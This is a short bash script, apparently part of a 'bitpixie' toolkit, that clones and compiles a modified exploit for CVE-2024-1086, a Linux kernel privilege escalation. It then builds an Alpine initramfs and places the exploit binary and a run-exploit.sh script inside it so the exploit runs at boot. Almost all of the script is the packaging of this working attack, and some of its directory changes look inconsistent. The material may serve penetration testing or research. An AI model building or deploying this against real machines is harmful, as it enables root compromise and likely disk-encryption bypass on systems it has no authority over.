#!/bin/bash

# Clone modified CVE-2024-1086 repository
git clone https://github.com/andigandhi/CVE-2024-1086_bitpixie

# Build CVE-2024-1086 exploit
cd CVE-2024-1086_bitpixie
make
cd ..

# Clone Alpine initramfs builder
git clone https://github.com/lsiudut/alpine-initrd
set -e -x

# download Alpine initramfs builder files
pushd .
cd alpine-initrd/docker/ && docker build -t lucks/alpine-builder .
popd

sudo rm -rf alpine/ &&
  mkdir alpine

sudo docker run -t -i --rm -v "$PWD/alpine/:/alpine/" lucks/alpine-builder

# enable ttyS0 and add it as secure tty
sed -i 's/#\(ttyS0.*\)/\1/' alpine/etc/inittab
echo ttyS0 >> alpine/etc/securetty
cd ../..

# manipulate Alpine initramfs
sudo cp CVE-2024-1086_bitpixie/exploit alpine-initrd/alpine/bin/
sudo cp Scripts/run-exploit.sh alpine-initrd/alpine/root/
# TODO: Move other files to initramfs file system (kernel modules,...)

# build initramfs
cd alpine/ && sudo find . | sudo cpio -o -H newc | xz -C crc32 -z -9 --threads=0 -c - > ../alpine-initrd.xz
